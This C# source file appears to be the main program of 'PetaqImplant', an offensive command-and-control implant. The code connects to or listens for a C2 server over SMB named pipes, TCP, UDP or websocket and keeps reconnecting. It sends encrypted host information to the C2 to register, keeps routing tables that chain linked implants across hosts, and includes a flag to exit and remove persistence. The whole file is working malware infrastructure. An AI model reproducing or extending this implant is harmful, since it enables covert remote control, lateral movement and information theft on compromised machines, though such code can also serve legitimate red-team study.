using System;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Net.WebSockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Collections;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Collections.Concurrent;

namespace PetaqImplant
{
    class Program
    {
        private static object consoleLock = new object();
        private static readonly TimeSpan delay = TimeSpan.FromMilliseconds(30000);
        static UTF8Encoding encoder = new UTF8Encoding();
        public static ImplantServiceSocket LinkService;
        public static Dictionary<string, string> configuration = new Dictionary<string, string>();
        public static bool exit = false; // exit the implant
        public static bool terminate = false; // exit and remove persistency
        public static TextWriter consoleIO;
        // container for linked implants
        public static Dictionary<string, LinkedImplant> LinkedImplants = new Dictionary<string, LinkedImplant>(); 
        // routing table for linked implants
        public static ConcurrentDictionary<string, string> implantRoutes = new ConcurrentDictionary<string, string>();
        // Usage:              
        // implantRoutes.TryAdd("X1", "NextHop in Linked Implants");

        public static void Main(string[] args)
        {
            Configuration.InitConfiguration();

            if (args.Length != 0)
            {
                configuration["C2PROTO"] = args[0];

                switch (configuration["C2PROTO"])
                {
                    case "smb":
                        if (args.Length > 1)
                            configuration["NAMEDPIPE"] = args[1];
                        break;
                    case "tcp":
                        configuration["LISTENPORT"] = args[1];
                        break;
                    case "udp":
                        configuration["LISTENPORT"] = args[1];
                        break;
                    case "websocket":
                        configuration["C2CONF"] = args[1];
                        break;
                    default:
                        Console.Error.WriteLine("Unsupported service type.");
                        return;
                }
                
            }
            else if(args.Length > 2)
            {
                configuration["SESSION_KEY"] = args[2];
            }

            while (!exit)
            {
                Connect(configuration["C2PROTO"]);
                Thread.Sleep(Int32.Parse(configuration["RECONNECT_DELAY"]));
            }
        }

        public static void Connect(string proto)
        {
            try
            {
                switch (proto)
                {
                    case "smb":
                        Console.Error.WriteLine("Listening to the named pipe on {0}", configuration["NAMEDPIPE"]);
                        LinkService = new NamedPipeServiceSocket();
                        LinkService.Start();
                        break;
                    case "tcp":
                        Console.Error.WriteLine("Listening to the TCP {0}", configuration["LISTENPORT"]);
                        LinkService = new TCPServiceSocket();
                        LinkService.Start();
                        break;
                    case "udp":
                        Console.Error.WriteLine("Listening to the UDP {0}", configuration["LISTENPORT"]);
                        LinkService = new UDPServiceSocket();
                        LinkService.Start();
                        break;
                    case "websocket":
                        Console.Error.WriteLine("Connecting to the websocket at {0}.", configuration["C2CONF"]);
                        LinkService = new WebSocketServiceSocket();
                        LinkService.Start();
                        break;
                    default:
                        Console.Error.WriteLine("Unsupported service type.");
                        break;
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine("C2 service exception {0}",e);
            }
            finally
            {
                if (LinkService.Status)
                {
                    Console.Error.WriteLine("Stopping the linking service.");
                    LinkService.Stop();
                }                  
            }
        }

        public static void ConsoleReset()
        {
            Console.Out.Close();
            var sw = new StreamWriter(Console.OpenStandardOutput());
            sw.AutoFlush = true;
            Console.SetOut(sw);
        }

        public static void Register()
        {
            Console.WriteLine("Registering the implant information.");
            string registration_data = Common.Encrypt("register " + Convert.ToBase64String(Encoding.UTF8.GetBytes(Common.GetInfo())));
            LinkService.Send(registration_data);
        }

        public static void RegisterLinkedImplants()
        {
            Console.WriteLine("Registering the linked sessions.");
            string link_data = Common.Encrypt("registerlinks " + Convert.ToBase64String(Encoding.UTF8.GetBytes(Common.GetLinkedImplantsJSON())));
            LinkService.Send(link_data);
            Console.WriteLine(Common.Decrypt(link_data));
        }

        public static void AskRegistrationsFromAllLinkedImplants()
        {
            if (Program.LinkedImplants.Count > 0)
            {
                Console.WriteLine("Asking registration updates from the linked sessions.");
                foreach (var li in Program.LinkedImplants)
                {
                    if (li.Value.implantObject.Status) { li.Value.implantObject.AskRegistration(); }
                }
            }
            return;
                
        }
        public static void AskRouteUpdatesFromAllLinkedImplants()
        {
            if (Program.LinkedImplants.Count > 0)
            {
                Console.WriteLine("Asking route updates from the linked sessions.");
                foreach (var li in Program.LinkedImplants)
                {
                    if (li.Value.implantObject.Status) { li.Value.implantObject.AskRouteUpdates(); }
                }
            }
            return;

        }

    }
}
